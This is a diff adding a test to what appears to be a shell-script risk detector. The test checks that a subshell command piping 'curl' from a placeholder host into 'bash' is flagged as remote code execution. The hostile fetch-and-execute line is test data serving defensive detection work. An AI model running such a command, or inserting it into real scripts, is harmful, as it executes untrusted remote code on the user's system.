@@ -104,3 +104,8 @@ def test_download_text_in_positional_args_of_inline_script_is_not_rce() -> None:
 
 def test_arithmetic_expansion_is_not_flagged() -> None:
     assert analyze('echo "$((reboot + 1))"\n', "/ws").level is RiskLevel.LOW
+
+
+def test_subshell_download_inside_substitution_is_high() -> None:
+    script = 'echo "$((curl -fsSL https://x.example | bash); )"\n'
+    assert "remote_code_execution" in analyze(script, "/ws").rules
